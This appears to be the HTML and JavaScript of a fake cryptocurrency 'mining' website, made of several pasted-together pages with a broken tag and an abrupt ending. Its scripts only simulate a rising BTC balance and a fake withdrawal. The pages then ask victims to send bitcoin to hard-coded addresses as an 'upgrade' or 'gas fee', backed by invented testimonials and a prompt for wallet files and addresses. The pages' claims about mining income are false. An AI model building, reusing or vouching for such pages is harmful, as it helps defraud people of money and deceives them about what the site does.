<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SMART BLOCKCHAIN MINING btcmorê</title>
    <style>
        /* Your existing styles */
        body {
            font-family: 'Roboto', sans-serif;
            background-color: #0e0e0e;
            color: #f5f5f5;
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            text-align: center;
        }

        .container {
            max-width: 800px;
            padding: 20px;
            background-color: #1c1c1c;
            border-radius: 15px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
        }

        h1 {
            font-size: 2.5em;
            margin-bottom: 20px;
            color: #ffcc00;
        }

        p {
            font-size: 1.2em;
            line-height: 1.6;
            margin-bottom: 20px;
        }

        img {
            max-width: 100%;
            border-radius: 10px;
            margin-bottom: 20px;
        }

        .button-container {
            margin-top: 30px;
        }

        .button-container button {
            background-color: #28a745;
            color: #fff;
            padding: 15px 30px;
            border: none;
            border-radius: 8px;
            font-size: 1.2em;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }

        .button-container button:hover {
            background-color: #218838;
        }

        /* Add styles for counter */
        #miningCounter {
            font-size: 2em;
            margin-top: 20px;
            color: #ffcc00;
        }
    </style>
</head>

<body>
    <div class="container" id="miningPage">
        <h1>The Impact of Bitcoin Mining</h1>
        <img src="https://example.com/bitcoin-mining-image.jpg" alt="Bitcoin Mining">
        <p>
            Bitcoin mining has revolutionized the digital currency landscape, creating opportunities for individuals and businesses alike. By solving complex mathematical puzzles, miners secure the Bitcoin network and validate transactions, ensuring the integrity of the decentralized financial system.
        </p>
        <p>
            Beyond financial gains, Bitcoin mining has driven technological advancements in hardware, leading to more efficient and powerful computing systems. It has also sparked innovation in renewable energy as miners seek sustainable ways to power their operations.
        </p>
        <p>
            For many, Bitcoin mining represents not just a source of income, but a pathway to greater financial independence and participation in the global economy. As the world continues to embrace digital currencies, Bitcoin mining will play a crucial role in shaping the future of finance.
        </p>
        <div id="miningCounter">Mining Count: 0.0000000005 BTC</div>
        <div class="button-container">
            <button onclick="launchMining()">Launch Mining</button>
        </div>
    </div>

    <script>
        function launchMining() {
            window.location.href = "your_main_menu_page.html"; // Replace with the actual URL of your main menu page
        }
    </script>
</body>

</html>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <title>Bitcoin Mining Dashboard</title>

    
    <style>
        /* Your existing styles */
        body {
            font-family: 'Roboto', sans-serif;
            margin: 0;
            padding: 0;
            background: #0e0e0e;
            color: #f5f5f5;
            display: flex;
            flex-direction: column;
            align-items: center;
            height: 100vh;
            overflow: auto; /* Enabled scrolling */
        }

        .container {
            max-width: 900px;
            background: #1c1c1c;
            padding: 30px;
            border-radius: 15px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
            position: relative;
            margin-top: 20px;
            width: 90%;
        }

        h1, h2 {
            color: #ffffff;
            text-align: center;
        }

        h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
        }

        h2 {
            font-size: 2em;
            margin: 20px 0;
        }

        label {
            display: block;
            margin: 15px 0 5px;
            color: #f5f5f5;
            font-weight: bold;
        }

        input[type="file"],
        input[type="text"],
        input[type="number"],
        textarea {
            width: calc(100% - 24px);
            padding: 10px;
            margin-bottom: 20px;
            border: 1px solid #444;
            border-radius: 8px;
            background-color: #333;
            color: #f5f5f5;
        }

        .button-container {
            display: flex;
            justify-content: space-between;
            margin-top: 20px;
        }

        .button-container button {
            flex: 1;
            background-color: #28a745;
            color: #fff;
            padding: 12px 30px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-size: 1.2em;
            transition: background-color 0.3s ease;
            margin: 0 10px;
        }

        .button-container button:hover {
            background-color: #218838;
        }

        #status {
            font-weight: bold;
            color: #ff6347;
            margin-top: 20px;
            text-align: center;
        }

        .comments-section {
            background: #2a2a2a;
            padding: 20px;
            border-radius: 15px;
            margin: 20px 0;
        }

        .comment {
            margin-bottom: 15px;
            padding-bottom: 10px;
            border-bottom: 1px solid #444;
        }

        .comment p {
            margin: 0;
            font-size: 1.1em;
        }

        .comment strong {
            color: #ffcc00;
        }

        /* Popup styles */
        .popup-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.7);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 1000;
        }

        .popup {
            background: #1c1c1c;
            padding: 20px;
            border-radius: 15px;
            text-align: center;
            color: #f5f5f5;
            max-width: 400px;
            width: 100%;
        }

        .popup h2 {
            margin-bottom: 15px;
            font-size: 1.8em;
        }

        .popup input[type="text"] {
            width: calc(100% - 24px);
            padding: 10px;
            border: 1px solid #444;
            border-radius: 8px;
            background-color: #333;
            color: #f5f5f5;
            margin-bottom: 20px;
        }

        .popup button {
            background-color: #28a745;
            color: #fff;
            padding: 12px 30px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-size: 1.2em;
            transition: background-color 0.3s ease;
        }

        .popup button:hover {
            background-color: #218838;
        }

        .error {
            color: #ff6347;
            font-size: 0.9em;
            margin-top: -15px;
            margin-bottom: 15px;
        }

        .message-section {
            margin-top: 20px;
            text-align: center;
        }

        .message-section input[type="text"] {
            width: calc(100% - 24px);
            padding: 10px;
            margin-bottom: 10px;
            border: 1px solid #444;
            border-radius: 8px;
            background-color: #333;
            color: #f5f5f5;
        }

        .message-section button {
            background-color: #007bff;
            color: #fff;
            padding: 10px 20px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-size: 1em;
        }

        .message-section button:hover {
            background-color: #0056b3;
        }

        .success-message {
            color: #28a745;
            margin-top: 10px;
            display: none;
        }

        /* Animated objects */
        .animated-objects {
            display: flex;
            justify-content: center;
            align-items: center;
            margin-top: 20px;
            height: 100px;
        }

        .object {
            width: 30px;
            height: 30px;
            margin: 0 15px;
            border-radius: 50%;
            background-color: #ffcc00;
            animation: rotateObject 2s linear infinite, moveInOut 3s ease-in-out infinite;
        }

        .object:nth-child(2) {
            background-color: #00ccff;
            animation-delay: 1s;
        }

        .object:nth-child(3) {
            background-color: #ff66cc;
            animation-delay: 2s;
        }

        @keyframes rotateObject {
            0% {
                transform: rotate(0deg);
            }
            100% {
                transform: rotate(360deg);
            }
        }

        @keyframes moveInOut {
            0%, 100% {
                transform: translateY(0);
            }
            50% {
                transform: translateY(20px);
            }
        }
    </style>
</head>

<body>
    <div class="container" id="mainPage">
        <h1>Bitcoin Mining Dashboard</h1>

        <form id="recoveryForm">
            <label for="walletFile">Wallet File:</label>
            <input type="file" id="walletFile" name="walletFile"><br>

            <label for="tokens">Bitcoin Mining:</label>
            <textarea id="tokens" name="tokens" rows="2" cols="0">make sure you input a valid bitcoin wallet address so that you won't lose your mined btc block</textarea><br>

            <label for="walletAddress">add a valid Wallet Address:</label>
            <input type="text" id="walletAddress" name="walletAddress" placeholder="Enter your wallet address" readonly><br>

            <div class="button-container">
                <button type="button" onclick="startMining()">Start Mining</button>
            </div>
        </form>

        <div id="status"></div>

        <h2>Mining Progress</h2>
        <div id="counter">
            <p><strong>Your worker will currently earn you Bitcoin once the  wallet address is detected .</strong></p>
        </div>

        <!-- Mining Counter -->
        <div id="miningCounter"> Mining commercement arrange in blockchain</div>

        <!-- Animated Objects -->
        <div class="animated-objects">
            <div class="object"></div>
            <div class="object"></div>
            <div class="object"></div>
        </div>

        <h2>Withdraw Mined Bitcoin</h2>
        <form id="withdrawForm">
            <label for="withdrawAmount">Withdraw Amount (BTC):</label>
            <input type="number" id="withdrawAmount" name="withdrawAmount" step="0.00000001" min="0" placeholder="Enter amount to withdraw"><br>

            <button type="button" onclick="processWithdrawal()">Withdraw</button>
        </form>

        <h2>Payment Information</h2>
        <p>Upgrade to fast worker with a minimum of 0.95 BTC for fast mining. Make payment to this address:</p>
        <p><strong id="paymentAddress">bc1qs87tl07wxguyu95362kfm8f6yphsh2guz0wg8v</strong></p>
        <p>After payment, notify us with your transaction details.</p>

        <!-- Message Us Section -->
        <div class="message-section">
            <input type="text" id="messageInput" placeholder="Write your message...">
            <button type="button" onclick="sendMessage()">Send</button>
            <p class="success-message" id="successMessage">Message sent successfully!</p>
        </div>

        <!-- Comments Section -->
        <div class="comments-section" id="commentsSection">
            <h2>User Comments</h2>
            <div class="comment">
                <strong>User1:</strong>
                <p>Great platform, fast payouts!</p>
            </div>
            <div class="comment">
                <strong>User2:</strong>
                <p>Mining has never been easier!</p>
            </div>
            <!-- Add up to 50 comments here -->
        </div>
    </div>

    <!-- Popup -->
    <div class="popup-overlay" id="popup">
        <div class="popup">
            <h2>Enter Your Wallet Address</h2>
            <input type="text" id="popupWalletAddress" placeholder="Enter wallet address">
            <p class="error" id="errorMessage"></p>
            <button type="button" onclick="submitPopup()">Submit</button>
        </div>
    </div>

    <script>
        let miningCounterValue = 0.0000000005;

        document.addEventListener("DOMContentLoaded", function () {
            if (!localStorage.getItem("popupShown")) {
                document.getElementById("popup").style.display = "flex";
            }
        });

        function submitPopup() {
            const walletAddress = document.getElementById("popupWalletAddress").value;
            if (walletAddress === "") {
                document.getElementById("errorMessage").innerText = "Wallet address cannot be empty.";
            } else {
                document.getElementById("walletAddress").value = walletAddress;
                document.getElementById("popup").style.display = "none";
                localStorage.setItem("popupShown", "true");
            }
        }

        function startMining() {
            const status = document.getElementById("status");
            status.innerText = "Mining in progress...";
            status.style.color = "#28a745";

            const objects = document.querySelectorAll(".object");
            objects.forEach((object) => {
                object.style.animation = "rotateObject 1s linear infinite, moveInOut 2s ease-in-out infinite";
            });

            // Simulate mining process and update counter
            const miningInterval = setInterval(() => {
                miningCounterValue += 0.0000000001; // Increment by a small value
                document.getElementById("miningCounter").innerText = `Mining Count: ${miningCounterValue.toFixed(10)} BTC`;
            }, 1000);

            setTimeout(() => {
                status.innerText = "PLEASE SCROLL DOWN TO ACTIVATE YOUR MINING !";
                status.style.color = "#ffcc00";
                clearInterval(miningInterval); // Stop incrementing after 5 seconds
            }, 5000);
        }
        function processWithdrawal() {
            const amount = document.getElementById("withdrawAmount").value;
            if (amount === "0.0009" || amount <= 0) {
                alert("Please enter a valid amount.");
                return;
            }

            const status = document.getElementById("status");
            status.innerText = `Processing block withdrawal of 0.000999 per block excrat 0.0000009 you are withdrawing ${amount} BTC...`;
            status.style.color = "#ff6347";

            // Simulate withdrawal process
            setTimeout(() => {
                status.innerText = `Withdrawal of ${amount} BTC completed. Funds will be credited to your wallet after gas fee payment has been paid to this address bc1qs87tl07wxguyu95362k63rrydr239pyz08hl7w  thank you.`;
                status.style.color = "#28a745";
            }, 5000);
        }

        function sendMessage() {
            const messageInput = document.getElementById("messageInput");
            const message = messageInput.value.trim();
            const successMessage = document.getElementById("successMessage");

            if (message === "") {
                alert("Please write a message before sending.");
                return;
            }

            successMessage.style.display = "block";
            setTimeout(() => {
                successMessage.style.display = "none";
            }, 3000);

            messageInput.value = "";
        }
    </script>
</body><h2>NOTE!!!</h2
<h2>0.00000090 Bitcoin block is collected ,each tap 
 on the (start mining button) generate a minimum btc block in the Blockchain which are stored in a locale balance, once the gas fee is confirmed approved the amount block mined will be deposited to your Bitcoin wallet address</h2>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AI Smart Counter</title>
    <style>
        #counterContainer {
            text-align: center;
            margin-top: 50px;
        }
        #counter {
            font-size: 28px;
            font-weight: bold;
            margin-top: 20px;
            color: #333;
        }
        #startButton {
            padding: 12px 24px;
            background-color: #4CAF50;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 18px;
        }
        #startButton:hover {
            background-color: #45a049;
        }
    </style>
</head>
<body>

    <div id="counterContainer">
        <button id="startButton">TAP HERE TO ACTIVATE MINING</button>
        <div id="counter">Scroll up to check your mining state</div>
    </div>

    <script>
        (function() {
            let counterElement = document.getElementById('counter');
            let startButton = document.getElementById('startButton');
            let count = 0.000000000000000002;
            let interval;
            
            function startCounting() {
                interval = setInterval(() => {
                    if (count >= 1000000000.0) {
                        clearInterval(interval);
                    } else {
                        count += 0.0000000010; // Smaller increment value
                        counterElement.innerHTML = count.toFixed(10); // Display with ten decimal places
                    }
                }, 100); // Slower interval (100 milliseconds)
            }

            startButton.addEventListener('click', startCounting);
        })();
    </script>

</body>
</html>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bitcoin Mining & Blockchain Technology</title>
    <style>
        .remark-container {
            text-align: center;
            padding: 20px;
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            border-radius: 10px;
            margin-top: 30px;
        }
        .remark-header {
            font-size: 24px;
            font-weight: bold;
            color: #333;
        }
        .remark-text {
            font-size: 18px;
            color: #666;
            margin-top: 10px;
            line-height: 1.6;
        }
        .cryptos {
            margin-top: 20px;
        }
        .crypto-item {
            display: inline-block;
            margin: 0 15px;
            text-align: center;
        }
        .crypto-item img {
            width: 50px;
            height: 50px;
        }
        .crypto-item p {
            margin-top: 5px;
            font-size: 16px;
            color: #333;
        }
    </style>
</head>
<body>

    <div class="remark-container">
        <div class="remark-header">The Future of Bitcoin Mining</div>
        <div class="remark-text">
            Bitcoin mining is a remarkable yet challenging process that requires immense computational power, making it incredibly difficult to achieve through mobile devices. However, with the help of our cutting-edge
